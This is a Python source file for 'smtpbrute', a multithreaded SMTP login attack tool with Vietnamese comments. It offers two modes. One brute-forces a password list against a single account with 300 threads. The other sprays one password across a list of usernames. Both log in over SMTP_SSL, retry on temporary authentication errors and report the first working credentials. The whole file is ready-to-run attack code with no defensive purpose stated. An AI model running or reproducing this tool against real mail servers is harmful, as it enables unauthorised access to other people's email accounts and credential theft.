#!/usr/bin/env python3
import smtplib
import sys
import threading
from queue import Queue
from colorama import Fore, Style, Back
from pyfiglet import Figlet

stop_flag = threading.Event()
final_result = []

def menu():
    print(Fore.LIGHTRED_EX + "Usage: smtp-brute \n userbrute \n passwordspray" + Fore.RESET)
    exit(1)

def main():
    try:
        global stop_flag
        global final_result
        tl = list()
        banner = Figlet(font='standard')
        print(Style.BRIGHT + Fore.RED + banner.renderText("smtpbrute")+ Style.NORMAL + Fore.RESET)
        dict = open(sys.argv[2], "r", errors="ignore")
        pwds = Queue()
        retry_queue = Queue()  # Hàng đợi để lưu các mật khẩu cần thử lại
        for pwd in dict.readlines():
            pwds.put(pwd.strip())
        print(Fore.LIGHTGREEN_EX + "[+] Attack started" + Fore.RESET)
        for _ in range(300):  # Number of threads
            t = threading.Thread(target=worker, args=(pwds, retry_queue, sys.argv[3]))
            t.start()
            tl.append(t)
        for t in tl:
            t.join()
        process_retries(retry_queue, sys.argv[3])  # Xử lý các mật khẩu cần thử lại
        print(Fore.LIGHTGREEN_EX + "[+] Attack finished" + Fore.RESET)
        dict.close()
        if final_result:
            print(Fore.BLUE + "[+] Final Result: " + Fore.RED + final_result[0] + Fore.RESET)
    except Exception as e:
        print(Fore.LIGHTRED_EX + "Usage: smtp-brute userbrute passwordlist.txt user RHOST RPORT")
        print(Fore.LIGHTRED_EX + f"Error: {e}" + Fore.RESET)

def worker(pwds, retry_queue, usr):
    while not pwds.empty() and not stop_flag.is_set():
        pwd = pwds.get()
        try_login(usr, pwd, retry_queue)
        pwds.task_done()

def try_login(usr, pwd, retry_queue):
    global final_result
    while True:
        try:
            global stop_flag
            if stop_flag.is_set():
                return
            print(Fore.YELLOW + f"[*] Trying password: {pwd} for user: {usr}" + Fore.RESET)
            server = smtplib.SMTP_SSL(sys.argv[4], int(sys.argv[5]))
            server.login(usr, pwd)
            print("\b"*80 + " "*80 + "\b"*81, end='', flush=True)
            result = f"[+] Password matched: {pwd}"
            print(Fore.BLUE + result + Fore.RED)
            final_result.append(result)
            stop_flag.set()
            server.quit()
            return  # Dừng ngay lập tức khi tìm thấy mật khẩu đúng
        except smtplib.SMTPAuthenticationError as e:
            print(Fore.RED + f"[-] Server response: {e.smtp_error.decode()}" + Fore.RESET)
            if (e.smtp_code == 535 and b'5.7.8 Error: authentication failed: (reason unavailable)' in e.smtp_error) or (e.smtp_code == 454 and b'4.7.0 Temporary authentication failure: Connection lost to authentication server' in e.smtp_error):
                # Đây là dòng thêm kiểm tra lỗi 454
                print(Fore.YELLOW + f"[!] Retrying password: {pwd} for user: {usr} due to temporary error" + Fore.RESET)
                retry_queue.put(pwd)  # Đưa mật khẩu vào hàng đợi retry
                break
            else:
                print(Fore.RED + f"[-] Failed with password: {pwd} for user: {usr} - {e}" + Fore.RESET)
                break

def process_retries(retry_queue, usr):
    while not retry_queue.empty() and not stop_flag.is_set():
        pwd = retry_queue.get()
        print(Fore.YELLOW + f"[!] Processing retry password: {pwd} for user: {usr}" + Fore.RESET)
        try_login(usr, pwd, retry_queue)
        retry_queue.task_done()

def userbrute():
    try:
        global stop_flag
        global final_result
        config = list()
        banner = Figlet(font='standard')
        print(Style.BRIGHT + Fore.RED + banner.renderText("smtpbrute") + Style.NORMAL + Fore.RESET)
        dict = open(sys.argv[2], "r", errors="ignore")
        users = Queue()
        retry_queue = Queue()
        for user in dict.readlines():
            users.put(user.strip())
        print(Fore.LIGHTGREEN_EX + "[+] Attack started" + Fore.RESET)
        for _ in range(3):  # Number of threads
            t = threading.Thread(target=user_worker, args=(users, retry_queue, sys.argv[3]))
            t.start()
            config.append(t)
        for t in config:
            t.join()
        process_user_retries(retry_queue, sys.argv[3])
        if final_result:
            print(Fore.BLUE + "[+] Final Result: " + Fore.RED + final_result[0] + Fore.RESET)
    except Exception as e:
        print(Fore.LIGHTRED_EX + "Usage: smtp-brute passwordspray userfile.txt password RHOST RPORT")
        print(Fore.LIGHTRED_EX + f"Error: {e}" + Fore.RESET)

def user_worker(users, retry_queue, pwd):
    while not users.empty() and not stop_flag.is_set():
        user = users.get()
        try_user_brute(user, pwd, retry_queue)
        users.task_done()

def try_user_brute(user, pwd, retry_queue):
    global final_result
    while True:
        try:
            global stop_flag
            if stop_flag.is_set():
                return
            print(Fore.YELLOW + f"[*] Trying user: {user} with password: {pwd}" + Fore.RESET)
            server = smtplib.SMTP_SSL(sys.argv[4], int(sys.argv[5]))
            server.login(user, pwd)
            print("\b"*80 + " "*80 + "\b"*81, end='', flush=True)
            result = f"[+] Password Found: {pwd}"
            print(Fore.BLUE + result + Fore.RED)
            final_result.append(result)
            stop_flag.set()
            server.quit()
            return  # Dừng ngay lập tức khi tìm thấy mật khẩu đúng
        except smtplib.SMTPAuthenticationError as e:
            print(Fore.RED + f"[-] Server response: {e.smtp_error.decode()}" + Fore.RESET)
            if (e.smtp_code == 535 and b'5.7.8 Error: authentication failed: (reason unavailable)' in e.smtp_error) or (e.smtp_code == 454 and b'4.7.0 Temporary authentication failure: Connection lost to authentication server' in e.smtp_error):
                # Đây là dòng thêm kiểm tra lỗi 454
                print(Fore.YELLOW + f"[!] Retrying user: {user} with password: {pwd} due to temporary error" + Fore.RESET)
                retry_queue.put(user)  # Đưa user vào hàng đợi retry
                break
            else:
                print(Fore.RED + f"[-] Failed with user: {user} and password: {pwd} - {e}" + Fore.RESET)
                break

def process_user_retries(retry_queue, pwd):
    while not retry_queue.empty() and not stop_flag.is_set():
        user = retry_queue.get()
        print(Fore.YELLOW + f"[!] Processing retry user: {user} with password: {pwd}" + Fore.RESET)
        try_user_brute(user, pwd, retry_queue)
        retry_queue.task_done()

def __init__():
    try:
        if sys.argv[1] == "userbrute":
            main()
        elif sys.argv[1] == "passwordspray":
            userbrute()
        elif len(sys.argv) < 2:
            menu()
        elif sys.argv[1] == "--help" or sys.argv[1] == "-h":
            print(Fore.LIGHTRED_EX + "Run smtp-brute To Get The Help Menu")
    except:
        menu()

__init__()

